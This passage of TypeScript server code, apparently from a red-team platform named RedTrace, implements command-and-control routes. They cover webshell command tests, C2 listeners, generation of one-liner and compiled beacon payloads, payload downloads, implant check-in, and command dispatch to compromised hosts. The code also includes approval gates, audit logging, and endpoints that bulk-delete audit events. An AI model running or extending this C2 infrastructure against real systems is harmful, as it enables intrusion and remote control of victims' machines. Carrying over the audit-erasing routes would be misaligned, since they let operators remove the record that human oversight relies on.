      const at = now(), resource = this.resource(task.resource_id), succeeded = result.completion === 'known' && result.error_code === null && result.exit_code === 0, status = task.status === 'cancelled' ? 'cancelled' : succeeded ? 'succeeded' : 'failed'
      const output = result.combined_output, outputId = uid('out'), bytes = Buffer.from(output), truncated = bytes.length > 2 * 1024 * 1024
      const content = truncated ? bytes.subarray(0, 2 * 1024 * 1024).toString() + '\n[output truncated by RedTrace]' : output
      const ref = `/projects/${task.project_id ?? '_global'}/operations/results/${outputId}`
      result = { ...result, output_ref: ref, truncated: result.truncated || truncated, completed_at: at, execution_context: { ...result.execution_context, resource_id: resource.id, host_id: JSON.parse(resource.metadata_json).host_id ?? null, route_id: JSON.parse(resource.metadata_json).route_id ?? null } }
      this.store.db.prepare('INSERT INTO operation_results VALUES (?,?,?,?,?,?,?,?)').run(outputId, task.project_id, id, 'text/plain; charset=utf-8', content, Buffer.byteLength(content), digest(content), at)
      const directory = path.join(this.outputRoot, resource.kind === 'webshell' ? 'webshell' : 'c2', 'results'); mkdirSync(directory, { recursive: true }); writeFileSync(path.join(directory, `${id}-${outputId}.txt`), content)
      if (JSON.parse(task.input_json).publish_result) this.create(task.project_id, { kind: 'result', name: `${resource.name} · ${task.action}`, target: ref, summary: output, metadata: { result_id: outputId, task_id: id }, actor_type: task.actor_type, actor: task.actor, source_task_id: id })
      const outputSummary = summarize(output || (succeeded ? '任务已完成，未返回文本输出' : 'operation failed'))
      const bounded = { ...result, stdout: result.stdout?.slice(0, 16384) ?? null, stderr: result.stderr?.slice(0, 16384) ?? null, combined_output: result.combined_output.slice(0, 32768), truncated: result.truncated || Buffer.byteLength(output) > 32768, saved_bytes: Buffer.byteLength(content) }
      this.store.db.prepare('UPDATE operation_tasks SET status=?,output_summary=?,result_ref=?,result_json=?,completed_at=? WHERE id=?').run(status, outputSummary, ref, JSON.stringify(bounded), at, id)
      const connectionError = ['TRANSPORT_ERROR', 'PROTOCOL_ERROR', 'TIMEOUT'].includes(String(result.error_code))
      if (succeeded && resource.status === 'available') this.updateResource(resource.id, { last_seen_at: at })
      else if (connectionError && resource.status === 'available') this.updateResource(resource.id, { status: 'degraded' })
      this.audit(task.project_id, task.resource_id, id, task, `operation.${task.action}`, status, { result_ref: ref, error_code: result.error_code, completion: result.completion, summary: outputSummary })
      if (succeeded && task.action === 'probe_info') {
        const metadata = JSON.parse(resource.metadata_json), observed: Record<string, string> = {}
        for (const line of output.split(/\r?\n/)) { const index = line.indexOf('='); if (index > 0) observed[line.slice(0, index)] = line.slice(index + 1) }
        metadata.observed = Object.keys(observed).length ? observed : { raw: output.slice(0, 4000) }; metadata.observed_at = at
        metadata.verified_capabilities = [...new Set([...(metadata.verified_capabilities ?? []), 'remote.command', 'remote.session.probe'])]
        this.verifiedResource(resource.id, { metadata_json: JSON.stringify(metadata) })
      }
      return this.publicTask(this.task(id))
    })
  }
}

export function operationRoutes(router: Router, ops: Operations) {
  const db = ops.store.db, base = '/projects/:project', actor = (c: RequestContext, b: any = {}) => {
    const worker = c.req.headers['x-redtrace-worker']
    if (worker !== undefined && (typeof worker !== 'string' || !worker.trim() || worker === 'unknown')) throw new HttpError(403, 'Runtime worker identity is required')
    return { ...b, actor_type: worker !== undefined ? 'worker' : b.actor_type ?? 'human', actor: worker !== undefined ? worker : b.actor ?? 'admin', intent_id: c.req.headers['x-redtrace-intent'] ?? b.intent_id ?? null }
  }
  const add = (method: string, route: string, handler: (c: RequestContext) => unknown) => router.add(method, base + route, c => { ops.scope(c.params.project); return handler(c) })
  const resource = (c: RequestContext) => ops.resource(c.params.resource)
  const auditRows = (rows: any[]) => rows.map(({ detail_json, ...event }) => ({ ...event, detail: JSON.parse(detail_json) }))
  const selected = (c: RequestContext) => {
    ops.expireStale(c.params.project === '_global' ? undefined : c.params.project)
    const q = c.url.searchParams, clauses = [], args: any[] = []
    for (const key of ['kind', 'status']) if (q.get(key)) { clauses.push(`${key}=?`); args.push(q.get(key)) }
    if (q.get('q')?.trim()) { clauses.push('(name LIKE ? OR target LIKE ? OR summary LIKE ?)'); args.push(...Array(3).fill(`%${q.get('q')!.trim()}%`)) }
    args.push(queryNumber(c.url, 'limit', 200, 1, 500), queryNumber(c.url, 'offset', 0))
    const rows = db.prepare(`SELECT * FROM shared_resources ${clauses.length ? 'WHERE ' + clauses.join(' AND ') : ''} ORDER BY updated_at DESC LIMIT ? OFFSET ?`).all(...args)
    if (c.req.headers['x-redtrace-worker']) ops.store.transaction(() => ops.audit(c.params.project, null, null, actor(c), 'resource.list', 'succeeded', { count: rows.length }))
    return rows.map(r => ops.publicResource(r))
  }
  add('GET', '/resources', c => ({ project_id: c.params.project, scope: 'global', resources: selected(c) }))
  add('GET', '/operations/summary', c => { ops.expireStale(c.params.project === '_global' ? undefined : c.params.project); return { project_id: c.params.project, scope: 'global', resources: Object.fromEntries(db.prepare("SELECT kind,COUNT(*) AS count,SUM(status='available') AS available FROM shared_resources GROUP BY kind").all().map(r => [r.kind, { count: r.count, available: r.available }])), tasks: Object.fromEntries(db.prepare('SELECT status,COUNT(*) AS n FROM operation_tasks GROUP BY status').all().map(r => [r.status, r.n])) } })
  add('POST', '/resources', async c => {
    const b = actor(c, await body(c.req, Type.Object({ kind: Type.Union(resourceKinds.filter(k => k !== 'result').map(v => Type.Literal(v))), name: text(160), target: optional(Type.String({ maxLength: 4096 })), summary: optional(Type.String({ maxLength: 2000 })), status: optional(text(32)), metadata: optional(object), secret: optional(object), ...actorFields, worker: optional(Type.Union([Type.String(), Type.Null()])), parent_resource_id: optional(Type.Union([Type.String(), Type.Null()])), source_task_id: optional(Type.Union([Type.String(), Type.Null()])), publish_fact: optional(Type.Boolean()) })))
    if (b.publish_fact) throw new HttpError(409, 'Resources do not create formal Facts; conclude the owning Intent instead')
    if (c.params.project !== '_global' && ops.store.project(c.params.project).status === 'completed' && b.kind !== 'file') throw new HttpError(409, 'Completed projects only accept evidence and result resources')
    if (b.kind === 'c2_listener') b.metadata = { callback_url: `http://${c.req.headers.host}`, ...b.metadata }
    const result = ops.create(ops.scope(c.params.project), b)
    if (b.kind === 'c2_listener' && result.resource.status === 'available') void ops.startListener(result.resource.id)
    if (b.actor_type !== 'human' && b.kind !== 'c2_session') delete result.secret_once
    send(c.res, result, 201)
  })
  add('POST', '/webshell/test', async c => {
    if (!ops.adapterEnabled('redtrace-webshell')) throw new HttpError(409, 'WebShell adapter is disabled')
    const b = await body(c.req, Type.Object({ target: Type.String({ minLength: 1, maxLength: 4096 }), password: optional(Type.String({ maxLength: 512 })), shell_type: optional(Type.Union(['php', 'asp', 'aspx', 'jsp', 'custom'].map(v => Type.Literal(v)))), protocol: optional(Type.Union(['auto', 'eval', 'antsword', 'raw'].map(v => Type.Literal(v)))), method: optional(Type.Union(['POST', 'GET'].map(v => Type.Literal(v)))), command_param: optional(Type.String({ maxLength: 128 })), password_param: optional(Type.String({ maxLength: 128 })), target_os: optional(Type.Union(['auto', 'linux', 'windows'].map(v => Type.Literal(v)))), encoding: optional(Type.Union(['auto', 'utf-8', 'gbk', 'gb18030'].map(v => Type.Literal(v)))), verify_tls: optional(Type.Boolean()) }))
    try {
      const output = await executeWebshell(b.target, { shell_type: b.shell_type ?? 'php', protocol: b.protocol ?? 'auto', method: b.method ?? 'POST', command_param: b.command_param ?? '', password_param: b.password_param ?? '', os: b.target_os ?? 'auto', encoding: b.encoding ?? 'auto', verify_tls: b.verify_tls ?? false, timeout: 20 }, { password: b.password ?? '' }, 'probe', {}, c.signal)
      if (output.completion !== 'known' || output.exit_code !== 0 || output.error_code !== null) throw new Error('No reliable command execution proof')
      return { ok: true, summary: output.combined_output.trim().slice(0, 1000) || 'Connection succeeded', result: output }
    } catch (error) { throw new HttpError(400, `Connection test failed: ${error instanceof Error ? error.message : String(error)}`) }
  })
  add('GET', '/c2/listeners/:listener/oneliner-kinds', c => {
    const listener = ops.resource(c.params.listener); if (listener.kind !== 'c2_listener') throw new HttpError(400, 'Resource is not a C2 listener')
    return { listener_id: listener.id, kinds: compatibleOneliners(JSON.parse(listener.metadata_json)) }
  })
  add('POST', '/c2/payloads/oneliner', async c => {
    const b = await body(c.req, Type.Object({ listener_id: text(64), kind: text(64), callback_host: optional(Type.String({ maxLength: 512 })) })), listener = ops.resource(b.listener_id)
    if (listener.kind !== 'c2_listener') throw new HttpError(400, 'Resource is not a C2 listener')
    try {
      const metadata = JSON.parse(listener.metadata_json), command = generateOneliner(metadata, listener.id, JSON.parse(listener.secret_json).listener_token ?? '', b.kind, b.callback_host)
      const payload = ops.create(ops.scope(c.params.project), { kind: 'c2_payload', name: `${b.kind}-${listener.name}`, target: '', summary: `${b.kind} command for ${listener.name}`, metadata: { listener_id: listener.id, payload_type: 'command', source_type: c.req.headers['x-redtrace-worker'] ? 'worker' : 'generator', format: b.kind, size_bytes: Buffer.byteLength(command), sha256: digest(command) }, secret: { command }, ...actor(c), parent_resource_id: listener.id }).resource
      ops.audit(c.params.project, listener.id, null, actor(c), 'c2.payload_oneliner', 'succeeded', { kind: b.kind })
      return { oneliner: command, kind: b.kind, listener_id: listener.id, payload }
    } catch (error) { throw new HttpError(400, error instanceof Error ? error.message : String(error)) }
  })
  add('POST', '/c2/payloads/build', async c => {
    const b = await body(c.req, Type.Object({ listener_id: text(64), callback_url: optional(Type.String({ maxLength: 2048 })), os: optional(Type.Union(['linux', 'windows', 'darwin'].map(v => Type.Literal(v)))), arch: optional(Type.Union(['amd64', 'arm64', '386'].map(v => Type.Literal(v)))), sleep_seconds: optional(Type.Integer({ minimum: 1, maximum: 3600 })), actor: optional(text()) })), listener = ops.resource(b.listener_id)
    if (listener.kind !== 'c2_listener') throw new HttpError(400, 'Resource is not a C2 listener')
    const token = JSON.parse(listener.secret_json).listener_token; if (!token) throw new HttpError(409, 'Listener token is unavailable; recreate the listener')
    const directory = path.join(ops.outputRoot, 'c2', 'payloads'); mkdirSync(directory, { recursive: true })
    try {
      const artifact = await buildBeacon(directory, { listenerId: listener.id, listenerToken: token, metadata: JSON.parse(listener.metadata_json), callbackUrl: b.callback_url, os: b.os ?? 'linux', arch: b.arch ?? 'amd64', sleep: b.sleep_seconds ?? 5 }), filename = path.basename(artifact), bytes = readFileSync(artifact)
      const payload = ops.create(ops.scope(c.params.project), { kind: 'c2_payload', name: filename, target: `/projects/${c.params.project}/c2/payloads/download/${filename}`, summary: `${b.os ?? 'linux'}/${b.arch ?? 'amd64'} Beacon for ${listener.name}`, metadata: { listener_id: listener.id, payload_type: 'file', source_type: c.req.headers['x-redtrace-worker'] ? 'worker' : 'generator', platform: b.os ?? 'linux', arch: b.arch ?? 'amd64', size_bytes: bytes.length, filename, sha256: digest(bytes) }, secret: { artifact_path: artifact }, ...actor(c, b), parent_resource_id: listener.id }).resource
      ops.audit(c.params.project, listener.id, null, actor(c, b), 'c2.payload_build', 'succeeded', { payload_id: payload.id, os: b.os ?? 'linux', arch: b.arch ?? 'amd64' }); send(c.res, { payload }, 201)
    } catch (error) { throw new HttpError(400, error instanceof Error ? error.message : String(error)) }
  })
  add('POST', '/c2/payloads/external', async c => {
    const b = await body(c.req, Type.Object({ listener_id: text(64), format: optional(text()), options: optional(object), actor: optional(text()) })), listener = ops.resource(b.listener_id)
    if (listener.kind !== 'c2_listener') throw new HttpError(400, 'Resource is not a C2 listener')
    const metadata = JSON.parse(listener.metadata_json), secret = JSON.parse(listener.secret_json), endpoint = String(secret.adapter_endpoint ?? metadata.adapter_endpoint ?? '').replace(/\/$/, '')
    if (!endpoint) throw new HttpError(409, 'External C2 listener has no adapter endpoint')
    try {
      const response = await fetch(`${endpoint}/payloads`, { method: 'POST', headers: { Accept: 'application/json', 'Content-Type': 'application/json', ...(secret.token ? { Authorization: `Bearer ${secret.token}` } : {}) }, body: JSON.stringify({ framework: metadata.listener_type ?? 'custom', format: b.format ?? 'default', options: b.options ?? {} }), signal: AbortSignal.timeout(180_000) })
      if (!response.ok) throw new Error(`HTTP ${response.status}`); const generated: any = await response.json(); if (!generated?.target) throw new Error('adapter did not return a target')
      const payload = ops.create(ops.scope(c.params.project), { kind: 'c2_payload', name: generated.name ?? `${metadata.listener_type}-${b.format ?? 'default'}`, target: generated.target, summary: generated.summary ?? `${metadata.listener_type} ${b.format ?? 'default'} payload`, metadata: { ...generated.metadata, listener_id: listener.id, payload_type: 'external', source_type: c.req.headers['x-redtrace-worker'] ? 'worker' : 'generator', framework: metadata.listener_type, format: b.format ?? 'default', external: true }, ...actor(c, b), parent_resource_id: listener.id }).resource
      send(c.res, { payload }, 201)
    } catch (error) { throw new HttpError(502, `External C2 payload adapter failed: ${error instanceof Error ? error.message : String(error)}`) }
  })
  add('POST', '/c2/payloads/upload', async c => {
    const q = c.url.searchParams, filename = q.get('filename') ?? '', original = path.basename(filename)
    if (!filename || original !== filename || filename === '.' || filename === '..' || filename.includes('\\')) throw new HttpError(400, 'Invalid payload filename')
    const bytes = await rawBody(c.req), directory = path.join(ops.outputRoot, 'c2', 'payloads'); mkdirSync(directory, { recursive: true })
    const stored = `upload-${randomBytes(8).toString('hex')}${path.extname(filename).slice(0, 16)}`, artifact = path.join(directory, stored); writeFileSync(artifact, bytes)
    try {
      const listener = q.get('listener_id'); if (listener && ops.resource(listener).kind !== 'c2_listener') throw new HttpError(400, 'Resource is not a C2 listener')
      const payload = ops.create(ops.scope(c.params.project), { kind: 'c2_payload', name: q.get('name')?.trim() || original, target: `/projects/${c.params.project}/c2/payloads/download/${stored}`, summary: q.get('summary')?.trim() || 'Manually uploaded payload file', metadata: { listener_id: listener || null, payload_type: 'file', source_type: c.req.headers['x-redtrace-worker'] ? 'worker' : 'upload', platform: q.get('platform') ?? 'unknown', arch: q.get('arch') ?? 'unknown', filename: stored, original_filename: original, size_bytes: bytes.length, sha256: digest(bytes) }, secret: { artifact_path: artifact }, ...actor(c), parent_resource_id: listener || null }).resource
      ops.audit(c.params.project, payload.id, null, actor(c), 'c2.payload_upload', 'succeeded', { filename: original }); send(c.res, { payload }, 201)
    } catch (error) { rmSync(artifact, { force: true }); throw error }
  })
  add('GET', '/c2/payloads/download/:filename', c => {
    const filename = c.params.filename; if (filename.includes('..') || filename.includes('\\')) throw new HttpError(400, 'Invalid payload filename')
    const row: any = (db.prepare("SELECT * FROM shared_resources WHERE kind='c2_payload'").all() as any[]).find(item => JSON.parse(item.metadata_json).filename === filename)
    if (!row) throw new HttpError(404, 'Payload not found')
    const root = path.resolve(ops.outputRoot, 'c2', 'payloads'), artifact = path.resolve(String(JSON.parse(row.secret_json).artifact_path ?? ''))
    if (path.dirname(artifact) !== root || !statSync(artifact, { throwIfNoEntry: false })?.isFile()) throw new HttpError(404, 'Payload not found')
    const metadata = JSON.parse(row.metadata_json), bytes = readFileSync(artifact); c.res.writeHead(200, { 'Content-Type': 'application/octet-stream', 'Content-Length': bytes.length, 'Content-Disposition': `attachment; filename="${String(metadata.original_filename ?? filename).replaceAll('"', '')}"` }); c.res.end(bytes)
  })
  add('GET', '/resources/:resource', c => { ops.expireStale(c.params.project === '_global' ? undefined : c.params.project); return { resource: ops.publicResource(resource(c)), tasks: db.prepare('SELECT * FROM operation_tasks WHERE resource_id=? ORDER BY created_at DESC LIMIT 50').all(c.params.resource).map(t => ops.publicTask(t)), audit: auditRows(db.prepare('SELECT * FROM resource_audit_events WHERE resource_id=? ORDER BY id DESC LIMIT 100').all(c.params.resource)) } })
  add('POST', '/resources/:resource/material', c => {
    if (actor(c).actor_type !== 'human') throw new HttpError(403, 'Only human operators can retrieve payload material')
    const r = resource(c), secret = JSON.parse(r.secret_json)
    if (r.kind !== 'c2_payload' || typeof secret.command !== 'string') throw new HttpError(404, 'Command material not found')
    ops.store.transaction(() => ops.audit(r.project_id, r.id, null, actor(c), 'resource.material_read', 'succeeded'))
    return { command: secret.command }
  })
  add('DELETE', '/resources/:resource', c => {
    const r = resource(c)
    if (db.prepare("SELECT 1 FROM operation_tasks WHERE resource_id=? AND status IN ('queued','running','awaiting_approval')").get(c.params.resource)) throw new HttpError(409, 'Cancel active tasks before deleting this resource')
    ops.stopListener(c.params.resource)
    if (r.kind === 'c2_payload') {
      const artifact = path.resolve(String(JSON.parse(r.secret_json).artifact_path ?? '')), root = path.resolve(ops.outputRoot, 'c2', 'payloads')
      if (path.dirname(artifact) === root) rmSync(artifact, { force: true })
    }
    ops.store.transaction(() => { ops.audit(c.params.project, c.params.resource, null, { actor: c.url.searchParams.get('actor') ?? 'admin' }, 'resource.delete', 'succeeded'); db.prepare('DELETE FROM shared_resources WHERE id=?').run(c.params.resource) }); send(c.res, null, 204)
  })
  for (const action of ['lock', 'unlock', 'worker-control', 'state']) add('POST', `/resources/:resource/${action}`, async c => {
    const fields: Record<string, import('typebox').TSchema> = action === 'worker-control' ? { paused: Type.Boolean() } : action === 'state' ? { status: Type.Union(['available', 'offline', 'degraded', 'retired'].map(v => Type.Literal(v))) } : { actor: text(), actor_type: optional(Type.Union(['human', 'worker'].map(v => Type.Literal(v)))) }
    const b = Object.assign({ actor_type: 'human', actor: 'admin' }, await body(c.req, Type.Object({ ...fields, actor: fields.actor ?? optional(text()) }))) as any
    return ops.store.transaction(() => {
      const r = resource(c); let update: Record<string, any>, event = action
      if (action === 'lock') { if (r.locked_by && (r.locked_by !== b.actor || r.locked_by_type !== b.actor_type)) throw new HttpError(423, 'Resource is already locked'); update = { locked_by: b.actor, locked_by_type: b.actor_type, locked_at: now() } }
      else if (action === 'unlock') { if (r.locked_by && b.actor_type !== 'human' && (r.locked_by !== b.actor || r.locked_by_type !== b.actor_type)) throw new HttpError(423, 'Only the owner or a human can unlock'); update = { locked_by: null, locked_by_type: null, locked_at: null } }
      else if (action === 'worker-control') { update = { worker_paused: Number(b.paused) }; event = b.paused ? 'worker_pause' : 'worker_resume' }
      else { if (r.kind === 'c2_listener' && b.status === 'degraded') throw new HttpError(400, 'C2 listeners support available, offline, or retired'); update = { status: b.status } }
      const updated = ops.updateResource(r.id, update); ops.audit(c.params.project, r.id, null, b, `resource.${event}`, 'succeeded')
      if (action === 'state' && r.kind === 'c2_listener') b.status === 'available' ? void ops.startListener(r.id) : ops.stopListener(r.id)
      return { resource: updated }
    })
  })
  add('GET', '/authorizations', c => ({ authorizations: db.prepare('SELECT * FROM operation_authorizations WHERE project_id=? ORDER BY created_at DESC').all(ops.scope(c.params.project)).map((row: any) => ({ ...row, actions: JSON.parse(row.actions_json), resources: JSON.parse(row.resources_json), targets: JSON.parse(row.targets_json), route_ids: JSON.parse(row.route_ids_json) })) }))
  add('POST', '/authorizations', async c => {
    if (c.req.headers['x-redtrace-worker']) throw new HttpError(403, 'Workers cannot issue project authorizations')
    const b = await body(c.req, Type.Object({ actions: Type.Array(text(128), { minItems: 1, maxItems: 128 }), resources: optional(Type.Array(text(128), { maxItems: 128 })), targets: optional(Type.Array(text(2048), { maxItems: 128 })), route_ids: optional(Type.Array(text(128), { maxItems: 128 })), expires_at: Type.String({ format: 'date-time' }), issued_by: optional(text(128)) }))
    if (Date.parse(b.expires_at) <= Date.now()) throw new HttpError(422, 'Authorization expiry must be in the future')
    const id = uid('auth'); db.prepare('INSERT INTO operation_authorizations VALUES (?,?,?,?,?,?,?,?,?,?)').run(id, ops.scope(c.params.project), JSON.stringify(b.actions), JSON.stringify(b.resources ?? []), JSON.stringify(b.targets ?? []), JSON.stringify(b.route_ids ?? []), b.issued_by ?? 'admin', b.expires_at, null, now())
    ops.audit(c.params.project, null, null, { actor_type: 'human', actor: b.issued_by ?? 'admin' }, 'authorization.issue', 'succeeded', { authorization_id: id, actions: b.actions, expires_at: b.expires_at }); send(c.res, { authorization_id: id }, 201)
  })
  add('POST', '/authorizations/:authorization/revoke', async c => {
    if (c.req.headers['x-redtrace-worker']) throw new HttpError(403, 'Workers cannot revoke project authorizations')
    const b = await body(c.req, Type.Object({ actor: optional(text(128)) })); if (!db.prepare('UPDATE operation_authorizations SET revoked_at=? WHERE id=? AND project_id=? AND revoked_at IS NULL').run(now(), c.params.authorization, ops.scope(c.params.project)).changes) throw new HttpError(404, 'Active authorization not found')
    ops.audit(c.params.project, null, null, { actor_type: 'human', actor: b.actor ?? 'admin' }, 'authorization.revoke', 'succeeded', { authorization_id: c.params.authorization }); return { authorization_id: c.params.authorization, revoked: true }
  })
  add('POST', '/resources/:resource/lease', async c => {
    const b = actor(c, await body(c.req, Type.Object({ run_id: optional(text()), ttl_seconds: optional(Type.Integer({ minimum: 5, maximum: 3600 })), fencing_token: optional(Type.Integer({ minimum: 1 })), actor: optional(text()) })))
    ops.available(resource(c), b)
    const lease = ops.lease(resource(c), { ...b, owner_type: b.actor_type, owner: b.actor }); ops.audit(c.params.project, c.params.resource, null, b, 'resource.lease', 'succeeded', { fencing_token: lease.fencing_token, expires_at: lease.expires_at }); return { lease }
  })
  add('DELETE', '/resources/:resource/lease', c => {
    const r = resource(c), who = actor(c, { actor: c.url.searchParams.get('actor') ?? 'admin', fencing_token: queryNumber(c.url, 'fencing_token', 0, 1) })
    ops.releaseLease(r, who); ops.audit(c.params.project, r.id, null, who, 'resource.lease_release', 'succeeded'); send(c.res, null, 204)
  })
  add('POST', '/resources/:resource/tasks', async c => {
    const b = actor(c, await body(c.req, Type.Object({ action: text(), arguments: optional(object), ...actorFields, risk: optional(Type.Union(['low', 'medium', 'high', 'critical'].map(v => Type.Literal(v)))), requires_approval: optional(Type.Union([Type.Boolean(), Type.Null()])) })))
    send(c.res, { task: ops.createTask(ops.scope(c.params.project), c.params.resource, b) }, 202)
  })
  add('GET', '/operations/tasks', c => { const q = c.url.searchParams, clauses = [], args: any[] = []; for (const key of ['resource_id', 'status']) if (q.get(key)) { clauses.push(`${key}=?`); args.push(q.get(key)) }; return { project_id: c.params.project, scope: 'global', tasks: db.prepare(`SELECT * FROM operation_tasks ${clauses.length ? 'WHERE ' + clauses.join(' AND ') : ''} ORDER BY created_at DESC LIMIT ?`).all(...args, queryNumber(c.url, 'limit', 200, 1, 500)).map(t => ops.publicTask(t)) } })
  add('GET', '/operations/tasks/:operation', c => ({ task: ops.publicTask(ops.task(c.params.operation)) }))
  add('POST', '/operations/tasks/:operation/approval', async c => {
    if (c.req.headers['x-redtrace-worker']) throw new HttpError(403, 'Workers cannot approve tasks')
    const b = await body(c.req, Type.Object({ actor: optional(text()), decision: optional(Type.Union(['approve', 'reject'].map(v => Type.Literal(v)))) }))
    return ops.store.transaction(() => { const t = ops.task(c.params.operation); if (t.status !== 'awaiting_approval') throw new HttpError(409, 'Task is not awaiting approval'); const status = b.decision === 'reject' ? 'rejected' : 'queued'; db.prepare('UPDATE operation_tasks SET status=?,approved_by=?,approved_at=?,completed_at=? WHERE id=?').run(status, b.actor ?? 'admin', now(), status === 'rejected' ? now() : null, t.id); ops.audit(t.project_id, t.resource_id, t.id, b, 'operation.approval', status); ops.wake(); return { task: ops.publicTask(ops.task(t.id)) } })
  })
  add('POST', '/operations/tasks/:operation/cancel', async c => {
    const b = await body(c.req, Type.Object({ actor: optional(text()), reason: optional(Type.String({ maxLength: 500 })) }))
    return ops.store.transaction(() => { const t = ops.task(c.params.operation); if (!terminalTasks.includes(t.status)) { db.prepare("UPDATE operation_tasks SET status='cancelled',cancel_requested=1,output_summary=?,completed_at=? WHERE id=?").run(b.reason ?? 'cancelled by operator', now(), t.id); if (t.status !== 'running') ops.finish(t.id, executionResult('', null, { error_code: 'CANCELLED' })); ops.audit(t.project_id, t.resource_id, t.id, b, 'operation.cancel', 'cancelled'); ops.wake() }; return { task: ops.publicTask(ops.task(t.id)) } })
  })
  add('DELETE', '/operations/tasks/:operation', c => { const t = ops.task(c.params.operation); if (!terminalTasks.includes(t.status)) throw new HttpError(409, 'Cancel the task before deleting it'); db.prepare('DELETE FROM operation_tasks WHERE id=?').run(t.id); send(c.res, null, 204) })
  add('DELETE', '/operations/tasks', () => ({ deleted: db.prepare("DELETE FROM operation_tasks WHERE status IN ('succeeded','failed','cancelled','rejected') AND resource_id IN (SELECT id FROM shared_resources WHERE kind='c2_session')").run().changes, remaining: db.prepare("SELECT COUNT(*) AS n FROM operation_tasks WHERE resource_id IN (SELECT id FROM shared_resources WHERE kind='c2_session')").get()!.n }))
  add('GET', '/operations/results/:result', c => { const r: any = db.prepare('SELECT * FROM operation_results WHERE id=? AND project_id IS ?').get(c.params.result, ops.scope(c.params.project)); if (!r) throw new HttpError(404, 'Operation result not found'); c.res.writeHead(200, { 'Content-Type': r.content_type, 'X-RedTrace-SHA256': r.sha256, 'X-RedTrace-Task': r.task_id }); c.res.end(r.content) })
  add('GET', '/operations/audit', c => {
    const since = queryNumber(c.url, 'since', 0), args: any[] = [since], resourceId = c.url.searchParams.get('resource_id'), order = c.url.searchParams.get('order') ?? 'desc'
    if (!['asc', 'desc'].includes(order)) throw new HttpError(422, 'Invalid order')
    if (resourceId) args.push(resourceId)
    const events = auditRows(db.prepare(`SELECT * FROM resource_audit_events WHERE id>? ${resourceId ? 'AND resource_id=?' : ''} ORDER BY id ${order.toUpperCase()} LIMIT ?`).all(...args, queryNumber(c.url, 'limit', 200, 1, 500))), cursor = Math.max(since, ...events.map(e => e.id)), latest = Number(db.prepare('SELECT COALESCE(MAX(id),0) AS n FROM resource_audit_events').get()!.n)
    return { project_id: c.params.project, scope: 'global', audit_cursor: cursor, latest_cursor: latest, has_more: cursor < latest, events }
  })
  add('DELETE', '/operations/audit/:event', c => { const id = Number(c.params.event); if (!Number.isSafeInteger(id)) throw new HttpError(422, 'Invalid event id'); if (!db.prepare('DELETE FROM resource_audit_events WHERE id=?').run(id).changes) throw new HttpError(404, 'Audit event not found'); send(c.res, null, 204) })
  add('DELETE', '/operations/audit', () => ({ deleted: db.prepare(`DELETE FROM resource_audit_events WHERE ${c2Predicate}`).run().changes }))

  router.add('POST', '/c2/checkin/:listener', async c => {
    if (!ops.adapterEnabled('redtrace-c2')) throw new HttpError(409, 'C2 adapter is disabled')
    const b = await body(c.req, Type.Object({ version: optional(Type.Literal(1)), external_id: text(256), hostname: optional(Type.String({ maxLength: 256 })), username: optional(Type.String({ maxLength: 256 })), os: optional(Type.String({ maxLength: 128 })), arch: optional(Type.String({ maxLength: 64 })), process: optional(Type.String({ maxLength: 256 })), pid: optional(Type.Union([Type.Integer(), Type.Null()])), capabilities: optional(Type.Array(Type.String(), { maxItems: 128 })) }))
    const listener = ops.listener(c.params.listener, String(c.req.headers['x-redtrace-listener-token'] ?? '')), metadata = JSON.parse(listener.metadata_json), at = now()
    const sessionMetadata = { protocol_version: b.version ?? 1, source_project_id: listener.project_id ?? metadata.source_project_id, connection_type: 'beacon', shell_type: 'redtrace_beacon', reported_capabilities: b.capabilities ?? ['command'], verified_capabilities: [], connection_generation: randomBytes(8).toString('hex'), ...b }
    const token = randomBytes(32).toString('base64url'), secret = { session_token_sha256: digest(token) }
    let row: any = db.prepare("SELECT * FROM shared_resources WHERE kind='c2_session' AND parent_resource_id=? AND target=?").get(listener.id, b.external_id), created = !row
    if (!row) row = ops.create(listener.project_id, { kind: 'c2_session', name: `${b.username ? b.username + '@' : ''}${b.hostname || b.external_id}`, target: b.external_id, summary: `${b.os ?? ''} ${b.arch ?? ''}`.trim(), status: 'available', metadata: sessionMetadata, secret, actor_type: 'system', actor: `listener:${listener.id}`, parent_resource_id: listener.id }).resource
    else ops.updateResource(row.id, { status: 'available', metadata_json: JSON.stringify(sessionMetadata), secret_json: JSON.stringify(secret), last_seen_at: at })
    if (!created) for (const task of db.prepare("SELECT id FROM operation_tasks WHERE resource_id=? AND status='running'").all(row.id) as any[]) ops.finish(task.id, executionResult('Connection generation changed; previous attempt result unknown', null, { error_code: 'UNKNOWN_RESULT' }))
    ops.updateResource(listener.id, { last_seen_at: at }); ops.audit(listener.project_id, row.id, null, { actor_type: 'system', actor: `listener:${listener.id}` }, created ? 'c2.session_online' : 'c2.session_checkin', 'succeeded', { hostname: b.hostname ?? '', os: b.os ?? '', arch: b.arch ?? '' })
    return { project_id: listener.project_id, session_id: row.id, session_token: token, poll_path: `/c2/sessions/${row.id}/poll` }
  })
  router.add('POST', '/c2/sessions/:session/poll', c => {
    if (!ops.adapterEnabled('redtrace-c2')) throw new HttpError(409, 'C2 adapter is disabled')
    const session = ops.session(c.params.session, String(c.req.headers['x-redtrace-session-token'] ?? '')), at = now(), limit = queryNumber(c.url, 'limit', 10, 1, 20)
    return ops.store.transaction(() => {
      ops.updateResource(session.id, { status: 'available', last_seen_at: at })
      if (db.prepare("SELECT 1 FROM operation_tasks WHERE resource_id=? AND status='running'").get(session.id) || Number(db.prepare("SELECT COUNT(*) AS n FROM operation_tasks WHERE status='running'").get()!.n) >= 8) return { version: 1, session_id: session.id, tasks: [] }
      const tasks = db.prepare("SELECT * FROM operation_tasks WHERE resource_id=? AND status='queued' AND cancel_requested=0 ORDER BY created_at LIMIT ?").all(session.id, Math.min(limit, 1)) as any[]
      const dispatched = tasks.filter(t => ops.beforeDispatch(t, session))
      for (const t of dispatched) { db.prepare("UPDATE operation_tasks SET status='running',started_at=? WHERE id=?").run(at, t.id); ops.audit(t.project_id, session.id, t.id, { actor_type: 'system', actor: session.id }, 'operation.dispatch', 'running') }
      return { version: 1, session_id: session.id, tasks: dispatched.map(t => ({ id: t.id, attempt_id: t.attempt_id, action: t.action, arguments: JSON.parse(t.input_json), created_at: t.created_at })) }
    })
  })
  router.add('POST', '/c2/sessions/:session/results/:operation', async c => {
